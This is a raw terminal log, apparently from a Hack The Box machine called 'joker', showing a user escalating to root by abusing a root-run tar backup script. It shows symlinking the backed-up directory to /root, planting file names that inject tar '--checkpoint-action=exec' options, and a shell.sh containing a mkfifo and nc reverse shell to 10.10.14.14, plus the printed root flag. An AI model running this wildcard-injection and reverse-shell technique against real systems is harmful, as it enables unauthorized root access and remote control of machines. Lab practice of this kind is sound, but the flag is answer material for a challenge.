@@ -1,0 +1,263 @@
+rm: remove write-protected regular file 'dev-1577921701.tar.gz'? y                     
+rm: remove write-protected regular file 'dev-1577922001.tar.gz'? y                     
+rm: remove write-protected regular file 'dev-1577922301.tar.gz'? y                     
+rm: remove write-protected regular file 'dev-1577922601.tar.gz'? y                     
+rm: remove write-protected regular file 'dev-1577922901.tar.gz'? y                     
+rm: remove write-protected regular file 'dev-1577923201.tar.gz'? y                     
+rm: remove write-protected regular file 'dev-1577923501.tar.gz'?                       
+yrm: remove write-protected regular file 'dev-1577923802.tar.gz'?                      
+rm: remove write-protected regular file 'dev-1577924101.tar.gz'? y                     
+rm: remove write-protected regular file 'dev-1577924401.tar.gz'? y                     
+rm: remove write-protected regular file 'dev-1577924701.tar.gz'? y                     
+rm: remove write-protected regular file 'dev-1577925001.tar.gz'? y                     
+rm: remove write-protected regular file 'dev-1577925301.tar.gz'? y                     
+yrm: remove write-protected regular file 'dev-1577925601.tar.gz'?                      
+yrm: remove write-protected regular file 'dev-1577925901.tar.gz'?                      
+y                                          
+yrm: remove write-protected regular file 'dev-1577926201.tar.gz'? rm: remove write-protected regular file 'dev-1577926501.tar.gz'? y                                           
+rm: remove write-protected regular file 'dev-1577926801.tar.gz'?                       
+yalekos@joker:~/backup$ y                  
+yy: command not found                      
+alekos@joker:~/backup$ yy                  
+yy: command not found                      
+alekos@joker:~/backup$ y                   
+y: command not found                       
+alekos@joker:~/backup$ y                   
+y: command not found                       
+alekos@joker:~/backup$                     
+alekos@joker:~/backup$ ls                  
+dev-1577874301.tar.gz  dev-1577884201.tar.gz  dev-1577906401.tar.gz  dev-1577909101.tar.gz  dev-1577916001.tar.gz  dev-1577918701.tar.gz  dev-1577926801.tar.gz                
+dev-1577875201.tar.gz  dev-1577899801.tar.gz  dev-1577907601.tar.gz  dev-1577913601.tar.gz  dev-1577916901.tar.gz  dev-1577923501.tar.gz                                       
+alekos@joker:~/backup$ whoami              
+alekos                                     
+alekos@joker:~/backup$ clear               
+alekos@joker:~/backup$ mkdir extract       
+alekos@joker:~/backup$ ls                  
+dev-1577874301.tar.gz  dev-1577899801.tar.gz  dev-1577909101.tar.gz  dev-1577916901.tar.gz  dev-1577926801.tar.gz  dev-1577927701.tar.gz                                       
+dev-1577875201.tar.gz  dev-1577906401.tar.gz  dev-1577913601.tar.gz  dev-1577918701.tar.gz  dev-1577927101.tar.gz  extract                                                     
+dev-1577884201.tar.gz  dev-1577907601.tar.gz  dev-1577916001.tar.gz  dev-1577923501.tar.gz  dev-1577927401.tar.gz                                                              
+alekos@joker:~/backup$ cd extract/         
+alekos@joker:~/backup/extract$ tar -xvf dev-1577927701.tar.gz                          
+tar: dev-1577927701.tar.gz: Cannot open: No such file or directory                     
+tar: Error is not recoverable: exiting now 
+alekos@joker:~/backup/extract$ tar -xvf ../dev-1577927701.tar.gz                       
+__init__.py                                
+application.py                             
+data/                                      
+data/shorty.db                             
+models.py                                  
+static/                                    
+static/style.css                           
+templates/                                 
+templates/layout.html                      
+templates/not_found.html                   
+templates/list.html                        
+templates/display.html                     
+templates/new.html                         
+utils.py                                   
+views.py                                   
+alekos@joker:~/backup/extract$ cd ../..    
+alekos@joker:~$ ls                         
+backup  development  user.txt              
+alekos@joker:~$ mv development development.bak                                         
+alekos@joker:~$ ln -s /root/ development   
+alekos@joker:~$ date                       
+Thu Jan  2 03:20:32 EET 2020               
+alekos@joker:~$ ls                         
+backup  development  development.bak  user.txt                                         
+alekos@joker:~$ cd development.bak         
+alekos@joker:~/development.bak$ ls         
+application.py  data  __init__.py  models.py  static  templates  utils.py  views.py    
+alekos@joker:~/development.bak$ ls *       
+application.py  __init__.py  models.py  utils.py  views.py                             
+
+data:                                      
+shorty.db                                  
+
+static:                                    
+style.css                                  
+
+templates:                                 
+display.html  layout.html  list.html  new.html  not_found.html                         
+alekos@joker:~/development.bak$ touch -- -la                                           
+alekos@joker:~/development.bak$ ls *       
+-rw-r----- 1 alekos alekos 1452 May 18  2017 application.py                            
+-rw-r----- 1 alekos alekos    0 May 18  2017 __init__.py                               
+-rw-r----- 1 alekos alekos  997 May 18  2017 models.py                                 
+-rw-r----- 1 alekos alekos 2500 May 18  2017 utils.py                                  
+-rw-r----- 1 alekos alekos 1748 May 18  2017 views.py                                  
+
+data:                                      
+total 20                                   
+drwxrwx--- 2 alekos alekos  4096 May 18  2017 .                                        
+drwxr-x--- 5 alekos alekos  4096 Jan  2 03:23 ..                                       
+-rw-r--r-- 1 alekos alekos 12288 May 18  2017 shorty.db                                
+
+static:                                    
+total 12                                   
+drwxr-x--- 2 alekos alekos 4096 May 18  2017 .                                         
+drwxr-x--- 5 alekos alekos 4096 Jan  2 03:23 ..                                        
+-rw-r----- 1 alekos alekos 1585 May 18  2017 style.css                                 
+
+templates:                                 
+total 28                                   
+drwxr-x--- 2 alekos alekos 4096 May 18  2017 .                                         
+drwxr-x--- 5 alekos alekos 4096 Jan  2 03:23 ..                                        
+-rw-r----- 1 alekos alekos  193 May 18  2017 display.html                              
+-rw-r----- 1 alekos alekos  524 May 18  2017 layout.html                               
+-rw-r----- 1 alekos alekos  725 May 18  2017 list.html                                 
+-rw-r----- 1 alekos alekos  624 May 18  2017 new.html                                  
+-rw-r----- 1 alekos alekos  231 May 18  2017 not_found.html                            
+alekos@joker:~/development.bak$ rm ./-la   
+alekos@joker:~/development.bak$ ls *       
+application.py  __init__.py  models.py  utils.py  views.py                             
+
+data:                                      
+shorty.db                                  
+
+static:                                    
+style.css                                  
+
+templates:                                 
+display.html  layout.html  list.html  new.html  not_found.html                         
+alekos@joker:~/development.bak$ date       
+Thu Jan  2 03:26:04 EET 2020               
+alekos@joker:~/development.bak$ cd ..      
+alekos@joker:~$ cd backup                  
+alekos@joker:~/backup$ ls                  
+dev-1577874301.tar.gz  dev-1577899801.tar.gz  dev-1577909101.tar.gz  dev-1577916901.tar.gz  dev-1577926801.tar.gz  dev-1577927701.tar.gz  extract                              
+dev-1577875201.tar.gz  dev-1577906401.tar.gz  dev-1577913601.tar.gz  dev-1577918701.tar.gz  dev-1577927101.tar.gz  dev-1577928001.tar.gz                                       
+dev-1577884201.tar.gz  dev-1577907601.tar.gz  dev-1577916001.tar.gz  dev-1577923501.tar.gz  dev-1577927401.tar.gz  dev-1577928301.tar.gz                                       
+alekos@joker:~/backup$ ls -la              
+total 684                                  
+drwxrwx--- 3 root   alekos 12288 Jan  2 03:25 .                                        
+drwxr-xr-x 7 alekos alekos  4096 Jan  2 03:20 ..                                       
+-rw-r----- 1 root   alekos 40960 Jan  1 12:25 dev-1577874301.tar.gz                    
+-rw-r----- 1 root   alekos 40960 Jan  1 12:40 dev-1577875201.tar.gz                    
+-rw-r----- 1 root   alekos 40960 Jan  1 15:10 dev-1577884201.tar.gz                    
+-rw-r----- 1 root   alekos 40960 Jan  1 19:30 dev-1577899801.tar.gz                    
+-rw-r----- 1 root   alekos 40960 Jan  1 21:20 dev-1577906401.tar.gz                    
+-rw-r----- 1 root   alekos 40960 Jan  1 21:40 dev-1577907601.tar.gz                    
+-rw-r----- 1 root   alekos 40960 Jan  1 22:05 dev-1577909101.tar.gz                    
+-rw-r----- 1 root   alekos 40960 Jan  1 23:20 dev-1577913601.tar.gz                    
+-rw-r----- 1 root   alekos 40960 Jan  2 00:00 dev-1577916001.tar.gz                    
+-rw-r----- 1 root   alekos 40960 Jan  2 00:15 dev-1577916901.tar.gz                    
+-rw-r----- 1 root   alekos 40960 Jan  2 00:45 dev-1577918701.tar.gz                    
+-rw-r----- 1 root   alekos 40960 Jan  2 02:05 dev-1577923501.tar.gz                    
+-rw-r----- 1 root   alekos 40960 Jan  2 03:00 dev-1577926801.tar.gz                    
+-rw-r----- 1 root   alekos 40960 Jan  2 03:05 dev-1577927101.tar.gz                    
+-rw-r----- 1 root   alekos 40960 Jan  2 03:10 dev-1577927401.tar.gz                    
+-rw-r----- 1 root   alekos 40960 Jan  2 03:15 dev-1577927701.tar.gz                    
+-rw-r----- 1 root   alekos 10240 Jan  2 03:20 dev-1577928001.tar.gz                    
+-rw-r----- 1 root   alekos 10240 Jan  2 03:25 dev-1577928301.tar.gz                    
+drwxrwxr-x 5 alekos alekos  4096 Jan  2 03:19 extract                                  
+alekos@joker:~/backup$ mkdir extract2      
+alekos@joker:~/backup$ cd extract2         
+alekos@joker:~/backup/extract2$ tar -xvf ../dev-1577928301.tar.gz                      
+backup.sh                                  
+root.txt                                   
+alekos@joker:~/backup/extract2$ cat root.txt                                                                                                                                   
+d452b7faf5fd5b30210f340ef1d4146e           
+alekos@joker:~/backup/extract2$ cd ../../development.bak/                              
+alekos@joker:~/development.bak$ touch -- --checkpoint=1                                
+alekos@joker:~/development.bak$ touch --checkpoint=1                                   
+touch: unrecognized option '--checkpoint=1'                                            
+Try 'touch --help' for more information.   
+alekos@joker:~/development.bak$ touch -- '--checkpoint-action=exec=sh shell.sh'        
+alekos@joker:~/development.bak$ nano shell.sh                                          
+alekos@joker:~/development.bak$ ls         
+application.py  --checkpoint=1  --checkpoint-action=exec=sh shell.sh  data  __init__.py  models.py  shell.sh  static  templates  utils.py  views.py                            
+alekos@joker:~/development.bak$ sed 's/tmp\/f/tmp\/i/g' shell.sh -i                                                                                                            
+alekos@joker:~/development.bak$ cat shell.sh                                           
+#!/usr/bin/bash                            
+rm /tmp/i                                  
+mkfifo /tmp/i                              
+cat /tmp/i|/bin/sh -i 2>&1|nc -u 10.10.14.14 8082 >/tmp/i                              
+alekos@joker:~/development.bak$ cd ..      
+alekos@joker:~$ rm development             
+alekos@joker:~$ mv development.bak/ development                                        
+alekos@joker:~$ ls                         
+backup  development  user.txt              
+alekos@joker:~$ date                       
+Thu Jan  2 03:40:09 EET 2020               
+alekos@joker:~$ chmod +x shell.sh          
+chmod: cannot access 'shell.sh': No such file or directory                             
+alekos@joker:~$ cd development/            
+alekos@joker:~/development$ ls             
+application.py  --checkpoint=1  --checkpoint-action=exec=sh shell.sh  data  __init__.py  models.py  shell.sh  static  templates  utils.py  views.py                            
+alekos@joker:~/development$ chmod +x shell.sh                                          
+alekos@joker:~/development$ ls             
+application.py  --checkpoint=1  --checkpoint-action=exec=sh shell.sh  data  __init__.py  models.py  shell.sh  static  templates  utils.py  views.py                            
+alekos@joker:~/development$ cd ..          
+alekos@joker:~$ cd backup/extract          
+alekos@joker:~/backup/extract$ ls          
+application.py  data  __init__.py  models.py  static  templates  utils.py  views.py    
+alekos@joker:~/backup/extract$ cd ../extract2                                          
+alekos@joker:~/backup/extract2$ ls         
+backup.sh  root.txt                        
+alekos@joker:~/backup/extract2$ cat backup.sh                                          
+#!/bin/sh                                  
+
+FILENAME="dev-$(date +%s).tar.gz"          
+
+cd /home/alekos/development;               
+tar cf /home/alekos/backup/$FILENAME *;    
+chown root:alekos /home/alekos/backup/$FILENAME;                                       
+chmod 640 /home/alekos/backup/$FILENAME;   
+alekos@joker:~/backup/extract2$ date       
+Thu Jan  2 03:44:06 EET 2020               
+alekos@joker:~/backup/extract2$ date       
+Thu Jan  2 03:44:49 EET 2020               
+alekos@joker:~/backup/extract2$ cd ../..   
+alekos@joker:~$ ls                         
+backup  development  user.txt              
+alekos@joker:~$ mv development/ development.bak                                        
+alekos@joker:~$ ls                         
+backup  development.bak  user.txt          
+alekos@joker:~$ date                       
+Thu Jan  2 03:46:43 EET 2020               
+alekos@joker:~$ cd backup                  
+alekos@joker:~/backup$ ls -la              
+total 748                                  
+drwxrwx--- 4 root   alekos 12288 Jan  2 04:00 .                                        
+drwxr-xr-x 7 alekos alekos  4096 Jan  2 03:46 ..                                       
+-rw-r----- 1 root   alekos 40960 Jan  1 12:25 dev-1577874301.tar.gz                    
+-rw-r----- 1 root   alekos 40960 Jan  1 12:40 dev-1577875201.tar.gz                    
+-rw-r----- 1 root   alekos 40960 Jan  1 15:10 dev-1577884201.tar.gz                    
+-rw-r----- 1 root   alekos 40960 Jan  1 19:30 dev-1577899801.tar.gz                    
+-rw-r----- 1 root   alekos 40960 Jan  1 21:20 dev-1577906401.tar.gz                    
+-rw-r----- 1 root   alekos 40960 Jan  1 21:40 dev-1577907601.tar.gz                    
+-rw-r----- 1 root   alekos 40960 Jan  1 22:05 dev-1577909101.tar.gz                    
+-rw-r----- 1 root   alekos 40960 Jan  1 23:20 dev-1577913601.tar.gz                    
+-rw-r----- 1 root   alekos 40960 Jan  2 00:00 dev-1577916001.tar.gz                    
+-rw-r----- 1 root   alekos 40960 Jan  2 00:15 dev-1577916901.tar.gz                    
+-rw-r----- 1 root   alekos 40960 Jan  2 00:45 dev-1577918701.tar.gz                    
+-rw-r----- 1 root   alekos 40960 Jan  2 02:05 dev-1577923501.tar.gz                    
+-rw-r----- 1 root   alekos 40960 Jan  2 03:00 dev-1577926801.tar.gz                    
+-rw-r----- 1 root   alekos 40960 Jan  2 03:05 dev-1577927101.tar.gz                    
+-rw-r----- 1 root   alekos 40960 Jan  2 03:10 dev-1577927401.tar.gz                    
+-rw-r----- 1 root   alekos 40960 Jan  2 03:15 dev-1577927701.tar.gz                    
+-rw-r----- 1 root   alekos 10240 Jan  2 03:20 dev-1577928001.tar.gz                    
+-rw-r----- 1 root   alekos 10240 Jan  2 03:25 dev-1577928301.tar.gz                    
+-rw-r----- 1 root   alekos 10240 Jan  2 03:30 dev-1577928601.tar.gz                    
+-rw-r----- 1 root   alekos 10240 Jan  2 03:35 dev-1577928901.tar.gz                    
+-rw-r--r-- 1 root   root       0 Jan  2 03:40 dev-1577929201.tar.gz                    
+-rw-r--r-- 1 root   root       0 Jan  2 03:45 dev-1577929501.tar.gz                    
+-rw-r----- 1 root   alekos 10240 Jan  2 03:50 dev-1577929801.tar.gz                    
+-rw-r----- 1 root   alekos 10240 Jan  2 03:55 dev-1577930102.tar.gz                    
+-rw-r----- 1 root   alekos 10240 Jan  2 04:00 dev-1577930401.tar.gz                    
+drwxrwxr-x 5 alekos alekos  4096 Jan  2 03:19 extract                                  
+drwxrwxr-x 2 alekos alekos  4096 Jan  2 03:27 extract2                                 
+alekos@joker:~/backup$ rm -r extract       
+alekos@joker:~/backup$ mkdir extract       
+alekos@joker:~/backup$ cd extract          
+alekos@joker:~/backup/extract$ tar -xvf ../dev-1577930401.tar.gz                       
+backup.sh                                  
+root.txt                                   
+alekos@joker:~/backup/extract$ cat root.txt
+d452b7faf5fd5b30210f340ef1d4146e           
+alekos@joker:~/backup/extract$ exit        
+logout                                     
+Connection to 10.10.10.21 closed.          
+┌─[root@parrot]─[~/hackthebox/joker]       
+└──╼ #                                     
